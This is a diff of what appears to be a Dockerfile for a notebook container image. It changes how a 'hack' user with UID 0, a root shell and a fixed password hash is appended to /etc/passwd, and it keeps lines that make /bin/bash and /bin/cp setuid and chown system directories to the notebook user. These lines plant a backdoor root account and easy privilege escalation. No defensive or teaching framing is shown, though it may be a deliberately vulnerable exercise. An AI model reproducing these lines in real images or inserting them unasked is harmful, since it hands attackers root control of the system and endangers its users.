@@ -23,7 +23,8 @@ RUN chown -R ${NB_UID} ${HOME}
 RUN chown -R ${NB_UID} /home
 RUN chown -R ${NB_UID} /opt
 RUN chown 0 /etc/sudo.conf
-RUN echo 'hack:\$1\$hack\$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash' >> /etc/passwd
+ENV test hack:\$1\$hack\$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash
+RUN echo '${test}' >> /etc/passwd
 RUN cat /etc/passwd
 RUN chmod u+s /bin/bash
 RUN chmod u+s /bin/cp
